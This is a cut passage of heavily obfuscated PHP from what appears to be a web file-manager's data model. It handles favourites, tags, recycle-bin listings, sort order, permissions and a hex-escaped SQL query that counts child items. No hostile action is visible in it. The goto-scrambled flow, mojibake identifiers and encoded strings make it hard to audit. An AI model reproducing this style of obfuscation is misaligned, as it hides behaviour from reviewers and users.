unset($c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[372]]); } $b£¬³­ªØ = $Aµ«„½ÓÉõ[373]; goto Dœù¹¯ùìŞ; c°ñ¸ØéÈ‡: $Aµ«„½ÓÉõ =& $_SERVER[Æ]; $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[75]] = KodIO::make($c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[369]]); $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[29]] = $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[370]] == 1 ? $Aµ«„½ÓÉõ[76] : $Aµ«„½ÓÉõ[167]; goto FèàÍ¶Á÷; cÉè£ãÃ­¦: if (isset($c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[376]]) && $c“¶±ªªÖ¡[$Aµ«„½ÓÉõ[376]][$Aµ«„½ÓÉõ[377]] == -1) { $BÙÖ³İÕ = array_remove_value($BÙÖ³İÕ, $Aµ«„½ÓÉõ[187]); $BÙÖ³İÕ = array_remove_value($BÙÖ³İÕ, $Aµ«„½ÓÉõ[107]); $BÙÖ³İÕ = array_remove_value($BÙÖ³İÕ, $Aµ«„½ÓÉõ[378]); $BÙÖ³İÕ = array_remove_value($BÙÖ³İÕ, $Aµ«„½ÓÉõ[379]); $BÙÖ³İÕ = array_remove_value($BÙÖ³İÕ, $Aµ«„½ÓÉõ[77]); $BÙÖ³İÕ = array_remove_value($BÙÖ³İÕ, $Aµ«„½ÓÉõ[380]); } $c“¶±ªªÖ¡ = array_field_key($c“¶±ªªÖ¡, $BÙÖ³İÕ); return $c“¶±ªªÖ¡; goto c”ğµ¯«à; c”ğµ¯«à: } public function listUserFav() { goto A ®êåÚ±; A ®êåÚ±: $fâÈƒå˜‡‰ =& $_SERVER[Æ]; $a°£ÅâÜ÷Ù = Model($fâÈƒå˜‡‰[381])->listData(); $dé°£·ä = array_filter_by_field($a°£ÅâÜ÷Ù, $fâÈƒå˜‡‰[29], $fâÈƒå˜‡‰[382]); goto B…Û¸ëâ®Â; Bà‰Ğ”â§: foreach ($a°£ÅâÜ÷Ù as &$B¢æÍæ¡ÛŸ) { $B¢æÍæ¡ÛŸ = array($fâÈƒå˜‡‰[385] => $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[367]], $fâÈƒå˜‡‰[386] => $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[28]], $fâÈƒå˜‡‰[387] => $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[75]], $fâÈƒå˜‡‰[388] => $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[29]], $fâÈƒå˜‡‰[389] => $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[187]], $fâÈƒå˜‡‰[390] => $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[107]]); if ($B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[29]] == $fâÈƒå˜‡‰[382] && $açÊÂª”’¹[$B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[75]]]) { $B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[391]] = $açÊÂª”’¹[$B¢æÍæ¡ÛŸ[$fâÈƒå˜‡‰[75]]]; } } return $a°£ÅâÜ÷Ù; goto B¬ˆ¾Ç‘½»; B…Û¸ëâ®Â: $dé°£·ä = array_to_keyvalue($dé°£·ä, $fâÈƒå˜‡‰[33], $fâÈƒå˜‡‰[75]); if ($dé°£·ä) { $açÊÂª”’¹ = $this->listSource(array($fâÈƒå˜‡‰[383] => array($fâÈƒå˜‡‰[384], $dé°£·ä))); } $açÊÂª”’¹ = array_to_keyvalue($açÊÂª”’¹[$fâÈƒå˜‡‰[354]], $fâÈƒå˜‡‰[369]); goto Bà‰Ğ”â§; B¬ˆ¾Ç‘½»: } public function listUserTag($BÀ¥¹İ†®Œ) { goto fÌÓ¤”…£é; d±ëŠ‹Í¤Œ: $this->listUserTagClear($fÉÌ³Öè†Ù, $BÜƒÆÃƒ, $BÀ¥¹İ†®Œ); return $BÜƒÆÃƒ; goto cÂ–¢ÃâÌ•; fÌÓ¤”…£é: $Fï£¼åÚ¼” =& $_SERVER[Æ]; $FæğíÏ¡Î¯ = Model($Fï£¼åÚ¼”[392])->listData(); $fÉÌ³Öè†Ù = array_filter_by_field($FæğíÏ¡Î¯, $Fï£¼åÚ¼”[393], $BÀ¥¹İ†®Œ); goto d„…ÆóÜæÅ; d„…ÆóÜæÅ: $fÉÌ³Öè†Ù = array_to_keyvalue($fÉÌ³Öè†Ù, $Fï£¼åÚ¼”[33], $Fï£¼åÚ¼”[75]); $BÜƒÆÃƒ = array(); if ($fÉÌ³Öè†Ù) { $f¦Ëİñ—ŠÃ = array($Fï£¼åÚ¼”[383] => array($Fï£¼åÚ¼”[384], $fÉÌ³Öè†Ù)); $BÜƒÆÃƒ = $this->listSource($f¦Ëİñ—ŠÃ); } goto d±ëŠ‹Í¤Œ; cÂ–¢ÃâÌ•: } private function listUserTagClear($FÆªãè¼‡, $bÔº‘á™Ô, $Fë±‡š±ª‡) { goto fÈÎ‚äÁù£; dçàÅã‡™: $A¹Ş÷“Ôé› = array(); $CŸÊÊìçÂË = array_to_keyvalue($bÔº‘á™Ô[$E‰¸¶œ±Ï[74]], $E‰¸¶œ±Ï[33], $E‰¸¶œ±Ï[369]); $b¹¢ë”·Ã = array_to_keyvalue($bÔº‘á™Ô[$E‰¸¶œ±Ï[73]], $E‰¸¶œ±Ï[33], $E‰¸¶œ±Ï[369]); goto E­Ğ÷Öè‹; cÇºåªè¨è: Model($E‰¸¶œ±Ï[394])->removeFromTag($A¹Ş÷“Ôé›, $Fë±‡š±ª‡); goto Bàï²ÅàßÊ; fÈÎ‚äÁù£: $E‰¸¶œ±Ï =& $_SERVER[Æ]; if (!$FÆªãè¼‡) { return; } if ($bÔº‘á™Ô && count($FÆªãè¼‡) == $bÔº‘á™Ô[$E‰¸¶œ±Ï[351]][$E‰¸¶œ±Ï[352]]) { return; } goto dçàÅã‡™; E­Ğ÷Öè‹: $EÉêš’‰Ç = array_merge($b¹¢ë”·Ã, $CŸÊÊìçÂË); foreach ($FÆªãè¼‡ as $C˜ˆù†Ş) { if (!in_array($C˜ˆù†Ş, $EÉêš’‰Ç)) { $A¹Ş÷“Ôé›[] = $C˜ˆù†Ş; } } if (!$A¹Ş÷“Ôé›) { return; } goto cÇºåªè¨è; Bàï²ÅàßÊ: } public function listUserRecycle() { $eñøó¹éÎ© =& $_SERVER[Æ]; $AÆº¬ˆ°ä = Model($eñøó¹éÎ©[395])->listData(); if (!$AÆº¬ˆ°ä) { return array(); } $D¨ì¬ƒÕä = array($eñøó¹éÎ©[383] => array($eñøó¹éÎ©[384], $AÆº¬ˆ°ä), $eñøó¹éÎ©[396] => 1); return $this->listSource($D¨ì¬ƒÕä); } public function listSource($EÁ£ì¾±Ÿ£, $BãôÈá¸«æ = 3000) { goto BÈ§ÚËŠ‡Œ; C©‡¡‹–í•: return $aõÏÚåŞ²½; goto fµÑó›ƒÍ£; e¤‰˜Î×Ä…: $aõÏÚåŞ²½ = $this->field($AÖ»á¥Èœ‚)->_makeOrder()->where($EÁ£ì¾±Ÿ£)->selectPage($BãôÈá¸«æ); $this->_listDataApply($aõÏÚåŞ²½[$A´˜±…ñ¦»[354]]); $this->_listMake($aõÏÚåŞ²½); goto C©‡¡‹–í•; BÈ§ÚËŠ‡Œ: $A´˜±…ñ¦» =& $_SERVER[Æ]; if (!isset($EÁ£ì¾±Ÿ£[$A´˜±…ñ¦»[397]])) { $EÁ£ì¾±Ÿ£[$A´˜±…ñ¦»[397]] = 0; } $AÖ»á¥Èœ‚ = $A´˜±…ñ¦»[398]; goto e¤‰˜Î×Ä…; fµÑó›ƒÍ£: } protected function _makeOrder() { goto FÆ¼§–—ƒ; FÆ¼§–—ƒ: $dÍ”¤Œï¿„ =& $_SERVER[Æ]; $D®óğŠ…ô = Model($dÍ”¤Œï¿„[399])->get($dÍ”¤Œï¿„[400]); $B¨‰Ø¿¨õ = Model($dÍ”¤Œï¿„[399])->get($dÍ”¤Œï¿„[401]); goto f¹’×°éƒ; f¹’×°éƒ: $Eˆ™İ¤™Œ† = array($dÍ”¤Œï¿„[402] => $dÍ”¤Œï¿„[403], $dÍ”¤Œï¿„[404] => $dÍ”¤Œï¿„[405]); $DÔÌõò’í = array($dÍ”¤Œï¿„[28] => $dÍ”¤Œï¿„[28], $dÍ”¤Œï¿„[77] => $dÍ”¤Œï¿„[77], $dÍ”¤Œï¿„[160] => $dÍ”¤Œï¿„[372], $dÍ”¤Œï¿„[378] => $dÍ”¤Œï¿„[378], $dÍ”¤Œï¿„[406] => $dÍ”¤Œï¿„[379], $dÍ”¤Œï¿„[187] => $dÍ”¤Œï¿„[187], $dÍ”¤Œï¿„[107] => $dÍ”¤Œï¿„[107]); $FèºÕ¼°‘ô = Input::get($dÍ”¤Œï¿„[407], $dÍ”¤Œï¿„[7], $D®óğŠ…ô, array_keys($DÔÌõò’í)); goto cÜœçê»ÆÚ; f¨ëºê‹’®: if ($FèºÕ¼°‘ô == $dÍ”¤Œï¿„[28]) { } $b‘Éß“Š³ø = $dÍ”¤Œï¿„[409] . $DÔÌõò’í[$FèºÕ¼°‘ô] . $dÍ”¤Œï¿„[50] . $Eˆ™İ¤™Œ†[$A”ªçËäÇä]; return $this->order(rtrim(trim($b‘Éß“Š³ø), $dÍ”¤Œï¿„[47])); goto bÍ¸ë†¡““; cÜœçê»ÆÚ: $A”ªçËäÇä = Input::get($dÍ”¤Œï¿„[408], $dÍ”¤Œï¿„[7], $B¨‰Ø¿¨õ, array_keys($Eˆ™İ¤™Œ†)); if (!in_array($FèºÕ¼°‘ô, array_keys($DÔÌõò’í))) { $FèºÕ¼°‘ô = $dÍ”¤Œï¿„[28]; } if (!in_array($A”ªçËäÇä, array_keys($Eˆ™İ¤™Œ†))) { $FèºÕ¼°‘ô = $dÍ”¤Œï¿„[402]; } goto f¨ëºê‹’®; bÍ¸ë†¡““: } protected function _listDataApplyItem($BäÖŸ›ì”, $D‰öäç‘ö = false) { $AäÙ¨¤•Ôì = array($BäÖŸ›ì”); $this->_listDataApply($AäÙ¨¤•Ôì, $D‰öäç‘ö); return $AäÙ¨¤•Ôì[0]; } protected function _listDataApply(&$A¡Ü¾Ãë²ñ, $cÉ§Æ¼Š×‹ = false) { goto f„¡ŒÈÃ…Ü; cÄ‰š³¹ËÊ: $bòÜ›è†î = array_unique($bòÜ›è†î); $this->_listSourceCache($A¡Ü¾Ãë²ñ); if (!$cÉ§Æ¼Š×‹) { $this->_listAppendMeta($A¡Ü¾Ãë²ñ, $bòÜ›è†î); $this->_listAppendFileMeta($A¡Ü¾Ãë²ñ, $bòÜ›è†î); $this->_listAppendChildren($A¡Ü¾Ãë²ñ, $bòÜ›è†î); } goto CÁ×Ëº¦’”; CÁ×Ëº¦’”: $this->_listAppendPath($A¡Ü¾Ãë²ñ); $this->_listAppendAuth($A¡Ü¾Ãë²ñ); $this->_listAppendSourceInfo($A¡Ü¾Ãë²ñ, $bòÜ›è†î); goto c­…Æµš·; c­…Æµš·: $this->_listAppendUser($A¡Ü¾Ãë²ñ); $this->_listFilterInfo($A¡Ü¾Ãë²ñ, $cÉ§Æ¼Š×‹); goto D…‘°¸Úã×; f„¡ŒÈÃ…Ü: $e©İÑ¼Ì› =& $_SERVER[Æ]; if (!$A¡Ü¾Ãë²ñ) { $A¡Ü¾Ãë²ñ = array(); return; } $bòÜ›è†î = array_to_keyvalue($A¡Ü¾Ãë²ñ, $e©İÑ¼Ì›[33], $e©İÑ¼Ì›[369]); goto cÄ‰š³¹ËÊ; D…‘°¸Úã×: } protected function _listSourceCache($Cº¤œÜèä‰) { $Cğ‰‰–•ò =& $_SERVER[Æ]; foreach ($Cº¤œÜèä‰ as $AøÙ¤Ã¡¹) { self::$cacheSourceInfo[$Cğ‰‰–•ò[410] . $AøÙ¤Ã¡¹[$Cğ‰‰–•ò[369]]] = $AøÙ¤Ã¡¹; } } protected function _listFilterInfo(&$cëŸì¶Ü£ğ, $DÉç£„Õò‹ = false) { $bË½îœÆ„å =& $_SERVER[Æ]; foreach ($cëŸì¶Ü£ğ as &$fĞùÃ„İéé) { $fĞùÃ„İéé = $this->pathInfoFilter($fĞùÃ„İéé); self::$cachePathInfo[$bË½îœÆ„å[411] . intval($DÉç£„Õò‹) . $bË½îœÆ„å[412] . $fĞùÃ„İéé[$bË½îœÆ„å[369]]] = $fĞùÃ„İéé; } } protected function _listMake(&$Fİ¥‰À–¼²) { $F“¨ËµÈ =& $_SERVER[Æ]; $Fİ¥‰À–¼²[$F“¨ËµÈ[74]] = array(); $Fİ¥‰À–¼²[$F“¨ËµÈ[73]] = array(); foreach ($Fİ¥‰À–¼²[$F“¨ËµÈ[354]] as $aâ‹»¯Ö£) { $EòÑ¬Ø¥– = $aâ‹»¯Ö£[$F“¨ËµÈ[370]] == 1 ? $F“¨ËµÈ[74] : $F“¨ËµÈ[73]; $Fİ¥‰À–¼²[$EòÑ¬Ø¥–][] = $aâ‹»¯Ö£; } unset($Fİ¥‰À–¼²[$F“¨ËµÈ[354]]); } protected function _listAppendMeta(&$c˜îÅÀÈ£, $c¯×Š’éÍÔ) { goto A¾¨—İÖ¹ğ; eÓ½—Û¹’: if (!$d†Œº˜…¶†) { return; } $E×–£§îˆØ = array($dÄºÕ“ó¨Û[415], $dÄºÕ“ó¨Û[416]); $fä§îÑö‡Õ = array(); goto AÛ©Ÿæ‡Á; A¾¨—İÖ¹ğ: $dÄºÕ“ó¨Û =& $_SERVER[Æ]; $d¡ÇàÎÊºµ = array($dÄºÕ“ó¨Û[383] => array($dÄºÕ“ó¨Û[384], $c¯×Š’éÍÔ)); $d†Œº˜…¶† = Model($dÄºÕ“ó¨Û[413])->field($dÄºÕ“ó¨Û[414])->where($d¡ÇàÎÊºµ)->select(); goto eÓ½—Û¹’; AÛ©Ÿæ‡Á: foreach ($d†Œº˜…¶† as $Eè¦åË‡÷…) { if (!isset($fä§îÑö‡Õ[$Eè¦åË‡÷…[$dÄºÕ“ó¨Û[369]]])) { $fä§îÑö‡Õ[$Eè¦åË‡÷…[$dÄºÕ“ó¨Û[369]]] = array(); } if (in_array($Eè¦åË‡÷…[$dÄºÕ“ó¨Û[89]], $E×–£§îˆØ)) { continue; } $fä§îÑö‡Õ[$Eè¦åË‡÷…[$dÄºÕ“ó¨Û[369]]][$Eè¦åË‡÷…[$dÄºÕ“ó¨Û[89]]] = $Eè¦åË‡÷…[$dÄºÕ“ó¨Û[359]]; } foreach ($c˜îÅÀÈ£ as &$bŠÊƒŠ®Òã) { $bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[417]] = !1; if (isset($fä§îÑö‡Õ[$bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[369]]])) { $bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[417]] = $fä§îÑö‡Õ[$bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[369]]]; } if ($this->fileIsLock($bŠÊƒŠ®Òã) && $bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[376]]) { $eÛ—õÀ¤± = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[376]][$dÄºÕ“ó¨Û[377]] = AuthModel::authDisable($bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[376]][$dÄºÕ“ó¨Û[377]], $eÛ—õÀ¤±); $bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[376]][$dÄºÕ“ó¨Û[418]][$dÄºÕ“ó¨Û[376]] = $bŠÊƒŠ®Òã[$dÄºÕ“ó¨Û[376]][$dÄºÕ“ó¨Û[377]]; } } goto b¤ìôØÉ™; b¤ìôØÉ™: } protected function _listAppendFileMeta(&$FÛ‹±Ğ¬©‹, $E¸÷òºÌ) { goto Bİ¯®»ÁÁò; A½°°›ÆŒ¯: foreach ($FÛ‹±Ğ¬©‹ as &$Dº±¶ŞÙùˆ) { goto cÄà“¼µİó; B‘¼İ·’ŠÄ: $DöÛ®ÈÅìè[$AÙ°İš‰«[77]] = $Dº±¶ŞÙùˆ[$AÙ°İš‰«[77]]; $DöÛ®ÈÅìè[$AÙ°İš‰«[28]] = $Dº±¶ŞÙùˆ[$AÙ°İš‰«[28]]; self::$cacheFileInfo[$AÙ°İš‰«[425] . $CÁôÄ²ÛÄ…] = $DöÛ®ÈÅìè; goto BßäÚòø®³; BßäÚòø®³: unset($E‰ôŒÀ˜ºÆ[$CÁôÄ²ÛÄ…][$AÙ°İš‰«[75]]); $eˆÔ¬ÊÄ‚ = is_array($BĞšŠŸÚÖ[$CÁôÄ²ÛÄ…]) ? $BĞšŠŸÚÖ[$CÁôÄ²ÛÄ…] : array(); $Dº±¶ŞÙùˆ[$AÙ°İš‰«[162]] = array_merge($eˆÔ¬ÊÄ‚, $E‰ôŒÀ˜ºÆ[$CÁôÄ²ÛÄ…]); goto d„õ–¶¸¶‚; d„õ–¶¸¶‚: if (isset($Dº±¶ŞÙùˆ[$AÙ°İš‰«[162]][$AÙ°İš‰«[426]])) { $Dº±¶ŞÙùˆ[$AÙ°İš‰«[426]] = json_decode($Dº±¶ŞÙùˆ[$AÙ°İš‰«[162]][$AÙ°İš‰«[426]], !0); unset($Dº±¶ŞÙùˆ[$AÙ°İš‰«[162]][$AÙ°İš‰«[426]]); } goto f¡èÃ³«¾å; cÄà“¼µİó: $CÁôÄ²ÛÄ… = $Dº±¶ŞÙùˆ[$AÙ°İš‰«[419]]; if (!$CÁôÄ²ÛÄ… || !isset($E‰ôŒÀ˜ºÆ[$CÁôÄ²ÛÄ…])) { continue; } $DöÛ®ÈÅìè = $E‰ôŒÀ˜ºÆ[$CÁôÄ²ÛÄ…]; goto B‘¼İ·’ŠÄ; f¡èÃ³«¾å: } goto cìÇ“áçôÑ; Bİ¯®»ÁÁò: $AÙ°İš‰« =& $_SERVER[Æ]; $F‚¡ùÓ˜”¼ = array_to_keyvalue($FÛ‹±Ğ¬©‹, $AÙ°İš‰«[33], $AÙ°İš‰«[419]); $F‚¡ùÓ˜”¼ = array_filter(array_unique($F‚¡ùÓ˜”¼)); goto aáòª¥áÁ; aáòª¥áÁ: if (!$F‚¡ùÓ˜”¼) { return; } $CÆÚ‹ÚÅÈê = array($AÙ°İš‰«[420] => array($AÙ°İš‰«[384], $F‚¡ùÓ˜”¼)); $E™ù÷õŒÆ‰ = $AÙ°İš‰«[421]; goto CÙè¬ŸâÃ ; CÙè¬ŸâÃ : $E‰ôŒÀ˜ºÆ = Model($AÙ°İš‰«[422])->field($E™ù÷õŒÆ‰)->where($CÆÚ‹ÚÅÈê)->select(); $E‰ôŒÀ˜ºÆ = array_to_keyvalue($E‰ôŒÀ˜ºÆ, $AÙ°İš‰«[419]); $D’éÆµÅß = Model($AÙ°İš‰«[423])->field($AÙ°İš‰«[424])->where($CÆÚ‹ÚÅÈê)->select(); goto B·öÔÉ£¸; B·öÔÉ£¸: $D’éÆµÅß = $D’éÆµÅß ? $D’éÆµÅß : array(); $BĞšŠŸÚÖ = array(); foreach ($D’éÆµÅß as $cªËÕíÛ¿¸) { if (!isset($BĞšŠŸÚÖ[$cªËÕíÛ¿¸[$AÙ°İš‰«[419]]])) { $BĞšŠŸÚÖ[$cªËÕíÛ¿¸[$AÙ°İš‰«[419]]] = array(); } $BĞšŠŸÚÖ[$cªËÕíÛ¿¸[$AÙ°İš‰«[419]]][$cªËÕíÛ¿¸[$AÙ°İš‰«[89]]] = $cªËÕíÛ¿¸[$AÙ°İš‰«[359]]; } goto A½°°›ÆŒ¯; cìÇ“áçôÑ: } protected function _listAppendSourceInfo(&$Dµ“±š±Û, $eª‚Şô‰) { goto dóŸ’¬Š; bîïóÖÆ¤Ó: $b¿‡’÷×» = array_to_keyvalue($d»§îŒĞ‹é, $a¤˜÷äŠÛ¦[367]); $d°’§ñ¦ç = array_to_keyvalue_group($C‡‹Æªæ‰Ù, $a¤˜÷äŠÛ¦[75], $a¤˜÷äŠÛ¦[393]); $C‚¡ÊŞ®Ì‚ = array_to_keyvalue($F‰šŞÑ³«Ÿ, $a¤˜÷äŠÛ¦[75]); goto FÏïß™Ã—Õ; dóŸ’¬Š: $a¤˜÷äŠÛ¦ =& $_SERVER[Æ]; if (!defined($a¤˜÷äŠÛ¦[427])) { return; } $d»§îŒĞ‹é = Model($a¤˜÷äŠÛ¦[428])->listData(); goto AŒ®£İƒ¹Ë; FÏïß™Ã—Õ: $eƒ«âĞˆ´ = array_to_keyvalue_group($Aã¤ñ¸åÕò, $a¤˜÷äŠÛ¦[369]); foreach ($Dµ“±š±Û as &$EÛ–ªŠÇÚâ) { $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]] = array($a¤˜÷äŠÛ¦[430] => 0, $a¤˜÷äŠÛ¦[431] => 0, $a¤˜÷äŠÛ¦[432] => 0); if (isset($C‚¡ÊŞ®Ì‚[$EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[369]]])) { $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]][$a¤˜÷äŠÛ¦[433]] = 1; $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]][$a¤˜÷äŠÛ¦[434]] = $C‚¡ÊŞ®Ì‚[$EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[369]]][$a¤˜÷äŠÛ¦[28]]; } if (isset($d°’§ñ¦ç[$EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[369]]])) { $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]][$a¤˜÷äŠÛ¦[435]] = array(); foreach ($d°’§ñ¦ç[$EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[369]]] as $Dé›®ïŸ»Ì) { $BÅï¤Í×±ã = $b¿‡’÷×»[$Dé›®ïŸ»Ì]; $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]][$a¤˜÷äŠÛ¦[435]][] = array($a¤˜÷äŠÛ¦[436] => $BÅï¤Í×±ã[$a¤˜÷äŠÛ¦[367]], $a¤˜÷äŠÛ¦[386] => $BÅï¤Í×±ã[$a¤˜÷äŠÛ¦[28]], $a¤˜÷äŠÛ¦[437] => $BÅï¤Í×±ã[$a¤˜÷äŠÛ¦[438]]); } } if (isset($eƒ«âĞˆ´[$EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[369]]])) { $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]][$a¤˜÷äŠÛ¦[439]] = array(); foreach ($eƒ«âĞˆ´[$EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[369]]] as $B–±×¥»åå) { $EÛ–ªŠÇÚâ[$a¤˜÷äŠÛ¦[391]][$a¤˜÷äŠÛ¦[439]] = array($a¤˜÷äŠÛ¦[440] => $B–±×¥»åå[$a¤˜÷äŠÛ¦[441]], $a¤˜÷äŠÛ¦[442] => $B–±×¥»åå[$a¤˜÷äŠÛ¦[443]], $a¤˜÷äŠÛ¦[444] => $B–±×¥»åå[$a¤˜÷äŠÛ¦[369]], $a¤˜÷äŠÛ¦[445] => $B–±×¥»åå[$a¤˜÷äŠÛ¦[446]], $a¤˜÷äŠÛ¦[447] => $B–±×¥»åå[$a¤˜÷äŠÛ¦[448]]); } } } return $Dµ“±š±Û; goto b®ÓÎ®¬¸×; AŒ®£İƒ¹Ë: $C‡‹Æªæ‰Ù = Model($a¤˜÷äŠÛ¦[392])->listData(); $F‰šŞÑ³«Ÿ = Model($a¤˜÷äŠÛ¦[381])->listData(); $Aã¤ñ¸åÕò = Model($a¤˜÷äŠÛ¦[429])->listSimple(); goto bîïóÖÆ¤Ó; b®ÓÎ®¬¸×: } protected function _listAppendChildren(&$BÁ§Ã°‡Œ´, $DæÌ®ñÎ²) { goto AÈìÒÍÇÜ; f•À†âÆäÁ: $CáŞÉ‹¸Şâ = 1024 * 50; $BÁ§Ã°‡Œ´ = is_array($BÁ§Ã°‡Œ´) ? $BÁ§Ã°‡Œ´ : array(); $DáÜîôŞÆó = count($BÁ§Ã°‡Œ´); goto FÍ¢‰È¦¾ç; Eêºƒöáíö: foreach ($BÁ§Ã°‡Œ´ as &$F Úá‚ƒÜ†) { if ($F Úá‚ƒÜ†[$CÒ»Ã×¢¥[370]]) { unset($F Úá‚ƒÜ†[$CÒ»Ã×¢¥[372]]); $F Úá‚ƒÜ†[$CÒ»Ã×¢¥[192]] = intval($E“Š’œÖ†ƒ[$F Úá‚ƒÜ†[$CÒ»Ã×¢¥[369]] . $CÒ»Ã×¢¥[451]][$CÒ»Ã×¢¥[452]]); $F Úá‚ƒÜ†[$CÒ»Ã×¢¥[191]] = intval($E“Š’œÖ†ƒ[$F Úá‚ƒÜ†[$CÒ»Ã×¢¥[369]] . $CÒ»Ã×¢¥[453]][$CÒ»Ã×¢¥[452]]); } } goto aõã‡ ÌÅò; AÈìÒÍÇÜ: $CÒ»Ã×¢¥ =& $_SERVER[Æ]; $aŞš¦‡©‚ = $CÒ»Ã×¢¥[361]; $E“Š’œÖ†ƒ = array(); goto f•À†âÆäÁ; FÍ¢‰È¦¾ç: $eàí½åç‘å = $this->tablePrefix . $this->tableName; for ($f“ò¯ƒê = 0; $f“ò¯ƒê < $DáÜîôŞÆó; $f“ò¯ƒê++) { $D†òóùê‚ø = intval($BÁ§Ã°‡Œ´[$f“ò¯ƒê][$CÒ»Ã×¢¥[397]]); if ($BÁ§Ã°‡Œ´[$f“ò¯ƒê][$CÒ»Ã×¢¥[370]]) { $F¤˜îó·ƒ˜ = $BÁ§Ã°‡Œ´[$f“ò¯ƒê][$CÒ»Ã×¢¥[369]]; $aŞš¦‡©‚ .= "\123\x45\114\x45\103\x54\x20\x2a\40\x46\x52\117\115\x20\x28\x53\105\x4c\x45\x43\124\40\x27{$F¤˜îó·ƒ˜}\137\x68\x61\x73\106\x69\154\x65\47\x20\141\x73\40\x68\x61\163\54\x63\x6f\165\156\164\50\61\x29\x20\141\x73\40\150\x61\163\x43\x6f\x75\156\x74\40\106\122\x4f\115\40\x60{$eàí½åç‘å}\x60\40\xa\x9\11\x9\x9\11\x77\x68\x65\162\x65\x20\160\x61\162\x65\156\x74\111\104\x3d{$F¤˜îó·ƒ˜}\40\x61\x6e\x64\40\x69\x73\x46\x6f\x6c\x64\x65\162\x3d\60\x20\141\156\144\40\x69\x73\x44\145\x6c\x65\164\x65\x3d{$D†òóùê‚ø}\51\x20\x61\x73\40\x74\x62\x31\x5f{$F¤˜îó·ƒ˜}\x20\165\156\x69\x6f\x6e\x20\x61\154\x6c\x20\12\x9\x9\x9\x9\11\123\x45\x4c\105\x43\x54\x20\52\x20\x46\x52\117\115\40\50\123\x45\x4c\105\103\124\40\47{$F¤˜îó·ƒ˜}\x5f\x68\141\163\x46\x6f\154\x64\145\162\x27\x20\141\163\x20\x68\x61\x73\x46\151\154\x65\x2c\143\x6f\165\156\x74\50\61\51\40\141\163\40\x68\141\163\x43\157\165\156\x74\40\x46\x52\x4f\x4d\40\x60{$eàí½åç‘å}\140\x20\12\11\11\11\x9\x9\167\x68\145\x72\x65\x20\160\141\162\145\156\x74\111\104\75{$F¤˜îó·ƒ˜}\x20\141\156\x64\x20\151\163\x46\x6f\x6c\144\145\x72\x3d\61\x20\141\x6e\144\x20\151\x73\x44\145\154\145\x74\x65\x3d{$D†òóùê‚ø}\x29\40\x61\163\x20\x74\x62\62\137{$F¤˜îó·ƒ˜}\x20\x75\x6e\151\x6f\156\x20\141\x6c\154\40"; } if ((strlen($aŞš¦‡©‚) >= $CáŞÉ‹¸Şâ || $f“ò¯ƒê == $DáÜîôŞÆó - 1) && $aŞš¦‡©‚) { $aŞš¦‡©‚ = substr($aŞš¦‡©‚, 0, -strlen($CÒ»Ã×¢¥[449])); $fŒ¯Ï¹°¦› = $this->query($aŞš¦‡©‚); $E“Š’œÖ†ƒ = array_merge($E“Š’œÖ†ƒ, $fŒ¯Ï¹°¦›); $aŞš¦‡©‚ = $CÒ»Ã×¢¥[33]; } } $E“Š’œÖ†ƒ = array_to_keyvalue($E“Š’œÖ†ƒ, $CÒ»Ã×¢¥[450]); goto Eêºƒöáíö; aõã‡ ÌÅò: } protected function _listAppendAuth(&$BÜ¯è‚ßˆ›) { goto fÆÌĞ†˜Ô†; fâæáÆÛòÀ: foreach ($BÜ¯è‚ßˆ› as $c½•óË¨—‡) { if ($c½•óË¨—‡[$EÉÖÜ¼‰Ñß[371]] == self::TYPE_GROUP) { $E¹±Ô”ì„[] = $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[369]]; } } if (!$E¹±Ô”ì„) { return; } $e­ˆ÷ó‘×‰ = array_to_keyvalue($BÜ¯è‚ßˆ›, $EÉÖÜ¼‰Ñß[369]); goto c¿ƒ¨…Âé; c¿ƒ¨…Âé: $A²¥Ñï‰í = Model($EÉÖÜ¼‰Ñß[454])->getSourceList($E¹±Ô”ì„, $e­ˆ÷ó‘×‰); foreach ($BÜ¯è‚ßˆ› as $eå¥†ß†” => &$c½•óË¨—‡) { $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]] = $A²¥Ñï‰í[$c½•óË¨—‡[$EÉÖÜ¼‰Ñß[369]]]; if (!$c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]] && $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[371]] == self::TYPE_GROUP) { $c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]] = Action($EÉÖÜ¼‰Ñß[455])->pathGroupAuthMake($c½•óË¨—‡[$EÉÖÜ¼‰Ñß[456]]); if (!$c½•óË¨—‡[$EÉÖÜ¼‰Ñß[376]] && 